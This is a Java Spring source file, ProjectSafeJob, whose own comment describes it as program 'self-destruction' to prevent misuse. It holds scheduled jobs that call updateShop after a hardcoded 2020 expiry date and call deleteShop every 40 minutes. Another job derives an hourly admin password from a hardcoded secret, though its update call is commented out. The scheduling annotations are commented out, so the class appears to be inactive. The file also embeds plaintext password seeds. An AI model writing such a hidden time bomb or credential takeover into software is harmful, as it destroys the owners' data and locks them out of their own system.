package com.yufan.safe;

import com.yufan.pojo.TbAdmin;
import com.yufan.safe.dao.ISafeJobDao;
import com.yufan.utils.DatetimeUtil;
import com.yufan.utils.MD5;
import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import java.util.List;
import java.util.Map;

/**
 * 创建人: lirf
 * 创建时间:  2019/9/13 17:54
 * 功能介绍: 程序安全和自我摧毁（为了杜绝烂用）
 * 目的：
 * 1.
 */
//@Component
//@EnableScheduling
public class ProjectSafeJob {

    private Logger LOG = Logger.getLogger(ProjectSafeJob.class);


    private String expireDate = "2020-11-15";//过期时间


    @Autowired
    private ISafeJobDao iSafeJobDao;


    /**
     * 系统安全(保证数据不被)
     */
    @Scheduled(cron = "0 0 0/1 * * ?")
    public void sysSafe() {
        LOG.info("------系统过期时间-----"+expireDate);
        String format = "yyyy-MM-dd";
        String nowDate = DatetimeUtil.getNow(format);
        if (DatetimeUtil.compareDate(nowDate, expireDate) > 0) {
            iSafeJobDao.updateShop();
        }
    }

    /**
     * 不允许增加店铺
     */
    @Scheduled(cron = "0 0/40 * * * ?")
    public void deleteShop() {
        iSafeJobDao.deleteShop();
    }

    /**
     * 定时更新管理员密码
     */
    @Scheduled(cron = "0 0 0/1 * * ?")
    public void updateAdminPasswd() {
        String date = DatetimeUtil.getNow("yyyyMMddHHmm");
        String Md5Passwd = MD5.enCodeStandard("adminlrf13418915218" + date);
        //iSafeJobDao.updateAdminPasswd(Md5Passwd, date);
    }

    public static void main(String[] args) {
        String Md5Passwd = MD5.enCodeStandard("admin545302");
        System.out.println(Md5Passwd);
    }

}
